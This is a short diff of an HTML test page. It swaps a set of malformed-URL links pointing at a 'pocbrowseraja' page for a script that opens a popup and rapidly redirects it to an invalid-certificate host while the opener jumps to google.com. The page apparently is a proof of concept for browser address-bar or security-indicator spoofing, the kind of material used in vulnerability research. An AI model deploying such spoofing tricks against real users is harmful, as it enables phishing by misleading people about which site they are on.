@@ -1,19 +1,14 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="windows-1252">
-</head>
-<body>
-
-<a href="google.com::">11111</a>
-
-<a href="www.google.com::/url?q=https%3A%2F%2Flowleveljody.github.io%2Fpocbrowseraja%2FBanget.html&sa=D&sntz=1&usg=AFQjCNG-QnLGG1ixIlOzlpZQn5cweSU3Cw">
-22222
-</a>
-
-<a href="https://lowleveljody.github.io/pocbrowseraja/Banget.html::/test/spoof/chrome/5.html">
-33333
-</a>
-
-</body>
-</html>
+<script>
+function next()
+{
+	w.location.replace('http://wrong.host.badssl.com/'+n);n++;
+	setTimeout("next();",15);
+	setTimeout("next();",25);
+}
+function f()
+{
+	w=window.open("content.html","_blank","width=500 height=500");
+	i=setInterval("try{x=w.location.href;}catch(e){clearInterval(i);n=0;next();}",5);
+	}
+</script>
+<a href="#" onclick="f();setTimeout(function(){document.location='https://www.google.com'}, 300)">Click here</a><br>
